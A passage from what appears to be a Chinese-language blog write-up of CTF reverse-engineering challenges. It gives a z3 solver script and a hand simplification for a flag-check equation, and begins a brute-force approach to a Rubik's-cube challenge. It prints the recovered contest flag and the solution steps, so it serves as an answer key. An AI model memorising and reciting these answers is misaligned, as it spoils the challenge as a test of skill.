string">'flag0'</span><span class="token punctuation">)</span>flag1 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag1'</span><span class="token punctuation">)</span>flag2 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag2'</span><span class="token punctuation">)</span>flag3 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag3'</span><span class="token punctuation">)</span>flag4 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag4'</span><span class="token punctuation">)</span>flag5 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag5'</span><span class="token punctuation">)</span>flag6 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag6'</span><span class="token punctuation">)</span>flag7 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag7'</span><span class="token punctuation">)</span>flag8 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag8'</span><span class="token punctuation">)</span>flag9 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag9'</span><span class="token punctuation">)</span>flag10 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag10'</span><span class="token punctuation">)</span>flag11 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag11'</span><span class="token punctuation">)</span>flag12 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag12'</span><span class="token punctuation">)</span>flag13 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag13'</span><span class="token punctuation">)</span>flag14 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag14'</span><span class="token punctuation">)</span>flag15 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag15'</span><span class="token punctuation">)</span>flag16 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag16'</span><span class="token punctuation">)</span>flag17 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag17'</span><span class="token punctuation">)</span>flag18 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag18'</span><span class="token punctuation">)</span>flag19 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag19'</span><span class="token punctuation">)</span>flag20 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag20'</span><span class="token punctuation">)</span>flag21 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag21'</span><span class="token punctuation">)</span>flag22 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag22'</span><span class="token punctuation">)</span>flag23 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag23'</span><span class="token punctuation">)</span>flag24 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag24'</span><span class="token punctuation">)</span>flag25 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag25'</span><span class="token punctuation">)</span>flag26 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag26'</span><span class="token punctuation">)</span>flag27 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag27'</span><span class="token punctuation">)</span>flag28 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag28'</span><span class="token punctuation">)</span>flag29 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag29'</span><span class="token punctuation">)</span>flag30 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag30'</span><span class="token punctuation">)</span>flag31 <span class="token operator">=</span> Real<span class="token punctuation">(</span><span class="token string">'flag31'</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span>flag23 <span class="token operator">*</span> flag23<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag12 <span class="token operator">*</span> flag12<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag1 <span class="token operator">*</span> flag1<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">222</span> <span class="token operator">*</span> flag24<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag22 <span class="token operator">*</span> flag22<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag31 <span class="token operator">*</span> flag31<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag26 <span class="token operator">*</span>                                                                     flag26<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">178</span> <span class="token operator">*</span> flag9<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">232</span> <span class="token operator">*</span> flag29<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                   flag17 <span class="token operator">*</span> flag17<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">*</span>                                       flag23<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">226</span> <span class="token operator">*</span> flag6<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">110</span> <span class="token operator">*</span> flag7<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag19 <span class="token operator">*</span> flag19<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag2 <span class="token operator">*</span>                                                                                                      flag2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>                   <span class="token number">176</span> <span class="token operator">*</span> flag0<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag10 <span class="token operator">*</span> flag10<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">198</span> <span class="token operator">*</span> flag12<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag24 <span class="token operator">*</span>                                                                        flag24<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag9 <span class="token operator">*</span> flag9<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>                   <span class="token number">168</span> <span class="token operator">*</span> flag3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag8 <span class="token operator">*</span> flag8<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">134</span> <span class="token operator">*</span>                                                     flag2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag14 <span class="token operator">*</span> flag14<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">170</span> <span class="token operator">*</span> flag13<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                   flag4 <span class="token operator">*</span> flag4<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">142</span> <span class="token operator">*</span>                                     flag10<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag27 <span class="token operator">*</span> flag27<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag15 <span class="token operator">*</span> flag15<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">224</span> <span class="token operator">*</span> flag15<span class="token punctuation">)</span> <span class="token operator">+</span>           <span class="token punctuation">(</span>flag16 <span class="token operator">*</span> flag16<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">230</span> <span class="token operator">*</span> flag11<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">178</span> <span class="token operator">*</span> flag1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag28 <span class="token operator">*</span> flag28<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">246</span> <span class="token operator">*</span> flag5<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">168</span> <span class="token operator">*</span> flag17<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag30 <span class="token operator">*</span> flag30<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">220</span> <span class="token operator">*</span> flag21<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">212</span> <span class="token operator">*</span> flag22<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">232</span> <span class="token operator">*</span> flag16<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag25 <span class="token operator">*</span> flag25<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">140</span> <span class="token operator">*</span> flag4<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">250</span> <span class="token operator">*</span> flag31<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">*</span> flag28<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag11 <span class="token operator">*</span> flag11<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag13 <span class="token operator">*</span> flag13<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">234</span> <span class="token operator">*</span> flag14<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                   flag7 <span class="token operator">*</span> flag7<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">174</span> <span class="token operator">*</span> flag8<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag3 <span class="token operator">*</span> flag3<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">242</span> <span class="token operator">*</span> flag25<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag29 <span class="token operator">*</span> flag29<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag5 <span class="token operator">*</span> flag5<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">142</span> <span class="token operator">*</span> flag30<span class="token punctuation">)</span> <span class="token operator">-</span>           <span class="token punctuation">(</span><span class="token number">170</span> <span class="token operator">*</span> flag26<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">176</span> <span class="token operator">*</span> flag19<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag0 <span class="token operator">*</span> flag0<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">168</span> <span class="token operator">*</span> flag27<span class="token punctuation">)</span> <span class="token operator">+</span>           <span class="token punctuation">(</span>flag20 <span class="token operator">*</span> flag20<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">212</span> <span class="token operator">*</span> flag20<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag21 <span class="token operator">*</span> flag21<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag6 <span class="token operator">*</span> flag6<span class="token punctuation">)</span>           <span class="token operator">+</span> <span class="token punctuation">(</span>flag18 <span class="token operator">*</span> flag18<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">178</span> <span class="token operator">*</span> flag18<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">297412</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># 检查是否存在解</span><span class="token comment"># if solver.check() == sat:</span><span class="token comment"># # 获取解</span><span class="token comment">#     model = solver.model()</span><span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>sat<span class="token punctuation">:</span>    model<span class="token operator">=</span>solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span>    <span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token comment">#XYCTF&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No solution"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有点迷惑z3的变量设置了，因为用Int会跑很久，Real几秒出</p><p>所以该如何声明什么类型的变量，如何判断？</p><p>思路二是观察然后化简</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span> <span class="token keyword">and</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">176</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">134</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">246</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">226</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">174</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">142</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">230</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">198</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">176</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">212</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">220</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">212</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">242</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">142</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">297412</span> <span class="token operator">==</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过观察可以发现，每一行后面减的数除以二就是flag</p><hr /><h3 id="ez_cube"><a class="markdownIt-Anchor" href="#ez_cube"></a> ez_cube</h3><p>是一个魔方程序，先阅读一个类似的程序获得灵感</p><p><a href="https://blog.csdn.net/m0_46190471/article/details/115387567">用C语言写一个数字版的3阶魔方_简单c语言程序判断3*3洛术魔方-CSDN博客</a></p><p>151498</p><p>所以只能逆如何把cube还原，是利用CFOP公式</p><p>151605</p><p>151685</p><p><a href="https://rubiks-cube-solver.com/zh/">魔方求解器 (rubiks-cube-solver.com)</a></p><p>也可以用angr一把嗦,或者自己写脚本爆破</p><p>借鉴了一下dl的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span>red <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span>blue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span>green <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span>orange <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span>yellow <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span>white <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token keyword">def</span> <span class="token function">init_cube</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        red<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"red"</span>        blue<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"blue"</span>        green<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"green"</span>        orange<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"orange"</span>        yellow<span class="token 